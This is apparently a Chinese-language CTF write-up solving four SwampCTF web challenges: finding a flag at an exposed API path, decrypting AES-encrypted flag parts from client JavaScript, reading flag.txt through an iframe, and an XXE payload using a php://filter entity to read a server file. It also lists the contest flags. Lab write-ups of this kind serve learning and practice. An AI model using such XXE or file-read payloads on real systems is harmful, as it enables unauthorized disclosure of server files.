title: SWampCTF writeup
date: 2025-3-31 11:51:32
tags: CTF 
---


# SwampCTF


## WEB

### Serialies 

看他給的source

![image](https://hackmd.io/_uploads/S10Z3fBayg.png)
直覺看到PersonController.java 點下去
```java=

package com.serialies.serialies;

import org.springframework.web.bind.annotation.*;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;
import java.util.Optional;

@RestController
@RequestMapping("/api/person")
public class PersonController {

    private List<Person> persons = new ArrayList<>();

    @PostMapping
    public String createPerson(@RequestBody Person person) {
        if (person.getAddress() == null) {
            throw new IllegalArgumentException("Address is required");
        }
        if (person.getJob() != null) {
            try {
                person.getJob().init();
            } catch (IOException e) {
                throw new RuntimeException("Error", e);
            }
        }
        persons.add(person);
        return "Person has been created with ID: " + person.getId();
    }

    @GetMapping
    public List<Person> getAllPersons() {
        return persons;
    }

    @GetMapping("/{id}")
    public Person getPersonById(@PathVariable UUID id) {
        Optional<Person> person = persons.stream().filter(p -> p.getId().equals(id)).findFirst();
        if (person.isPresent()) {
            return person.get();
        } else {
            throw new RuntimeException("Person not found with ID: " + id);
        }
    }
}

```
看到他有給個路徑 就透過那個路徑進去那個頁面

![image](https://hackmd.io/_uploads/Hy8onMS6yg.png)


然後 找一找就看到flag了

> Flag: swampCTF{f1l3_r34d_4nd_d3s3r14l1z3_pwn4g3_x7q9z2r5v8}


### Beginner Web 
他是題黑箱 老樣子先F12
![image](https://hackmd.io/_uploads/rkVGpfHpke.png)
OK 有第一段Flag了
接著去翻console
![image](https://hackmd.io/_uploads/B1l86MHTyg.png)
看到這個 好吧看來要https
那我去翻js好了 .w. 
進到 main-34VY7I6V.js

![image](https://hackmd.io/_uploads/SJeTpfSa1g.png)
好醜.....是時候丟javasecret beautifiler了
然後我看到這行

```javascript=
 var gs = class e {
      constructor(t) {
          this.cookieService = t;
          let n = "flagPart2_3",
              r = "U2FsdGVkX1/oCOrv2BF34XQbx7f34cYJ8aA71tr8cl8=",
              o = "U2FsdGVkX197aFEtB5VUIBcswkWs4GiFPal6425rsTU=";
          this.cookieService.set("flagPart2", $n.AES.decrypt(r, n).toString($n.enc.Utf8), {
              expires: 7,
              path: "/",
              secure: !0,
              sameSite: "Strict"
          });
          let i = new Headers;
          i.set("flagPart3", $n.AES.decrypt(o, n).toString($n.enc.Utf8)), fetch("/favicon.ico", {
              headers: i
          })
      }
      date = new Date;
      static \u0275fac = function(n) {
          return new(n || e)(Wt(Ti))
      };
      static \u0275cmp = si({
          type: e,
          selectors: [
              ["app-root"]
          ],
          features: [ih([Ti])],
          decls: 4,
          vars: 1,
          template: function(n, r) {
              n & 1 && (Mn(0, "p"), ai(1, "Is it Tuesday?"), Tn(), hc(2, eE, 2, 0, "p")(3, tE, 2, 0, "p")), n & 2 && (bf(2), rh(r.date.getDay() == 3 ? 2 : 3))
          },
          styles: ["p[_ngcontent-%COMP%]{font-family:Comic Sans MS,cursive,sans-serif;font-size:24px;color:#ff69b4;text-shadow:2px 2px 5px yellow;background:repeating-linear-gradient(45deg,#0ff,#f0f 10%,#ff0 20%);padding:10px;border:5px dashed lime;transform:rotate(-5deg);animation:_ngcontent-%COMP%_wiggle .1s infinite alternate}@keyframes _ngcontent-%COMP%_wiggle{0%{transform:rotate(-5deg)}to{transform:rotate(5deg)}}"]
      })
  };
```

好的 來把 flag2 跟 flag3 decrypt吧

exploit:

```javascript=
const CryptoJS = require("crypto-js");

const key = "flagPart2_3";
const encryptedFlag2 = "U2FsdGVkX1/oCOrv2BF34XQbx7f34cYJ8aA71tr8cl8=";
const encryptedFlag3 = "U2FsdGVkX197aFEtB5VUIBcswkWs4GiFPal6425rsTU=";

const flag2 = CryptoJS.AES.decrypt(encryptedFlag2, key).toString(CryptoJS.enc.Utf8);
const flag3 = CryptoJS.AES.decrypt(encryptedFlag3, key).toString(CryptoJS.enc.Utf8);

console.log("Flag 2:", flag2);
console.log("Flag 3:", flag3);
```
得出的結果：
```
Flag 2: br0w53r5_4r3_
Flag 3: c0mpl1c473d
``` 
串在一起
> Flag: swampCTF{w3b_br0w53r5_4r3_c0mpl1c473d}


### Editor
他給了一個網站然後是可以Edit html 跟 css 的 我就想可不可以iframe去讀flag.txt
payload:
```html
<iframe src="flag.txt"></iframe>
```

> Flag: swampCTF{c55_qu3r135_n07_j5}


### SwampTech Solutions
他給了一個page叫我們登入 然後改cookie會進到admin pannel
![image](https://cdn.discordapp.com/attachments/1260799499094200320/1355929366173057195/image.png?ex=67eab720&is=67e965a0&hm=f16e887a1cf858a2ed393d4ec6c64e0fc0f32574cbcab90d53ec455e029a2759&format=webp&quality=lossless&width=1118&height=1244)

照慣例F12看一下

```html 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin Dashboard</title>
    <link rel="stylesheet" href="styles/adminpage.css">
</head>
<body>
    <div class="container">
        <h1>Admin Dashboard</h1>
        <p>Welcome, Admin!</p>

        <!-- This is for our intern, he doesn't know how to look through directories in linux -->
        <!-- Thankfully he won't be with us much longer -->
        <h2>Check if a File Exists</h2> 
        <form method="POST" action="check_file.php">
            <input type="text" name="filename" placeholder="Enter file name" required>
            <button type="submit">Check File</button>
        </form>

        
<h2>API Actions</h2>
<form id="apiForm" method="POST" action="api.php">
    <input type="text" id="userInput" name="userInput" placeholder="User ID" required>
    <input type="text" id="actionInput" name="actionInput" placeholder="Action" required>
    <button type="submit" id="getLogsButton">Fetch User Logs</button>
    <button type="submit" id="updateStatusButton">Update User Status</button>
</form>
        <div id="formContainer">
            <form id="xmlForm" action="process.php" method="POST" hidden>
    <br><h2>&#x50;&#x6c;&#x65;&#x61;&#x73;&#x65;&#x20;&#x63;&#x68;&#x65;&#x63;&#x6b;&#x20;&#x69;&#x6e;&#x20;&#x62;&#x65;&#x6c;&#x6f;&#x77;&#x20;&#x65;&#x76;&#x65;&#x72;&#x79;&#x20;&#x32;&#x20;&#x68;&#x6f;&#x75;&#x72;&#x73;&#x20;&#x73;&#x6f;&#x20;&#x49;&#x20;&#x6b;&#x6e;&#x6f;&#x77;&#x20;&#x79;&#x6f;&#x75;&#x27;&#x72;&#x65;&#x20;&#x64;&#x6f;&#x69;&#x6e;&#x67;&#x20;&#x79;&#x6f;&#x75;&#x72;&#x20;&#x6a;&#x6f;&#x62;</h2>
    <p><i>Consider finding the new location of this form every week a test of your commitment.</i></p><br>
    <label for="nameInput"><h3>Name (First Last):</h3></label>
    <input type="text" id="nameInput"><br><br>

    <label for="emailInput"><h3>Email (Your Swamptech company email):</h3></label>
    <input type="text" id="emailInput"><br><br>

    <input type="hidden" id="submitdataInput" name="submitdata">
    <button type="submit">Submit</button>
</form>

<script>
const _0x457886=_0x5449;function _0x5449(_0x5e77bc,_0x53436c){const _0x264509=_0x230a();return _0x5449=function(_0x4d3b94,_0x1caa75){_0x4d3b94=_0x4d3b94-(-0xce5+0x1*0x26cb+-0x821*0x3);let _0x211635=_0x264509[_0x4d3b94];return _0x211635;},_0x5449(_0x5e77bc,_0x53436c);}(function(_0x40ad7e,_0x4eb182){const _0x21d526=_0x5449,_0x48ecfe=_0x40ad7e();while(!![]){try{const _0x400dda=parseInt(_0x21d526(0x19a))/(0x1f*-0x3f+-0xd31+-0x14d3*-0x1)*(parseInt(_0x21d526(0x184))/(-0x1467+-0x8c5*0x2+0x1*0x25f3))+parseInt(_0x21d526(0x188))/(0x21d7+-0x1b8c+-0x324*0x2)*(-parseInt(_0x21d526(0x194))/(-0x5*-0x53a+0xae5*-0x2+-0x115*0x4))+-parseInt(_0x21d526(0x19c))/(0x2*0x564+-0x7be+-0x305)+parseInt(_0x21d526(0x197))/(0x1*-0x185b+-0x2*0xfbc+0x37d9)+parseInt(_0x21d526(0x196))/(-0x1*0x25cf+0x889*0x3+0x1f*0x65)*(-parseInt(_0x21d526(0x18d))/(0x1cc2+-0x2*-0x135a+-0x436e))+-parseInt(_0x21d526(0x19b))/(-0x1*-0x2164+-0x158b+-0xbd0)+parseInt(_0x21d526(0x18c))/(-0x21ea+0x1713+0xae1);if(_0x400dda===_0x4eb182)break;else _0x48ecfe['push'](_0x48ecfe['shift']());}catch(_0x467099){_0x48ecfe['push'](_0x48ecfe['shift']());}}}(_0x230a,0xdf14a+-0xc*-0x19505+0x2*-0x90581),document[_0x457886(0x193)+_0x457886(0x18a)](_0x457886(0x187))[_0x457886(0x192)+_0x457886(0x190)](_0x457886(0x189),function(_0x2c2e32){const _0x5752fb=_0x457886,_0x27431a={'SVHPC':_0x5752fb(0x19e),'BcSrP':_0x5752fb(0x191),'ztzto':_0x5752fb(0x1a0)+_0x5752fb(0x18b)};let _0x280be6=document[_0x5752fb(0x193)+_0x5752fb(0x18a)](_0x27431a[_0x5752fb(0x186)])[_0x5752fb(0x199)],_0x5c6cc6=document[_0x5752fb(0x193)+_0x5752fb(0x18a)](_0x27431a[_0x5752fb(0x18f)])[_0x5752fb(0x199)],_0x4c14fc=_0x5752fb(0x198)+_0x5752fb(0x19f)+_0x280be6+(_0x5752fb(0x195)+_0x5752fb(0x183))+_0x5c6cc6+(_0x5752fb(0x185)+_0x5752fb(0x18e));document[_0x5752fb(0x193)+_0x5752fb(0x18a)](_0x27431a[_0x5752fb(0x19d)])[_0x5752fb(0x199)]=_0x4c14fc;}));
function _0x230a(){const _0x1db7a4=['215644nfdbCm','</name>\x0a\x20\x20','439789TDKvtj','110262skVRnA','<root>\x0a\x20\x20\x20','value','1261373dQnbYi','7518690hquAEF','2161760yhNmOm','ztzto','nameInput','\x20<name>','submitdata','\x20\x20<email>','2TvAobf','</email>\x0a<','SVHPC','xmlForm','81VsftVd','submit','ById','Input','36128140QxzSCG','152sTHyTw','/root>','BcSrP','stener','emailInput','addEventLi','getElement'];_0x230a=function(){return _0x1db7a4;};return _0x230a();}
</script>        </div>


    </div>
    <script>
// Adding a submit event listener to the form
document.getElementById("apiForm").addEventListener("submit", function(event) {
    event.preventDefault();
    
    let userInput = document.getElementById('userInput').value;
    let actionInput = document.getElementById('actionInput').value;
    let actionType = event.submitter.id;

    // Prepare form data to be sent
    let formData = new URLSearchParams({ userInput, actionInput });

    if (actionType === "getLogsButton") {
        fetch('api.php', { method: 'POST', body: formData })
            .then(response => response.json())
            .then(data => {
                // Handle success
                console.log("System Logs:", data);
                document.getElementById('userInput').value = '';
                document.getElementById('actionInput').value = '';
            })
            .catch(error => console.error("Error fetching system logs:", error));
    } else if (actionType === "updateStatusButton") {
        fetch('api.php', { method: 'POST', body: formData })
            .then(response => response.json())
            .then(data => {
                // Handle success
                console.log("User Status Updated:", data);
                document.getElementById('userInput').value = '';
                document.getElementById('actionInput').value = '';
            })
            .catch(error => console.error("Error updating user status:", error));
    }
});

</script>
</body>
</html>
```

然後我發現這點很奇怪
```html 
<form id="xmlForm" action="process.php" method="POST" hidden>
<input type="hidden" id="submitdataInput" name="submitdata">
```
為甚麼要hidden呢？
於是我把hidden拿掉蹦 就有東西可以輸入了

然後他是要XML格式的東西 盲猜XXE:
然後他要用php filter chain 去讀東西：
final payload:
```
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "php://filter/read=convert.base64-encode/resource=flag.txt"> ]>
<root>
  <data>&ent;</data>
  <name>&ent;</name>
  <email>laol04916@gmail.a</email>
</root>
```

記得url encode XDD

> Flag: swampCTF{W0rk1NgCH41L5<r>_FuN}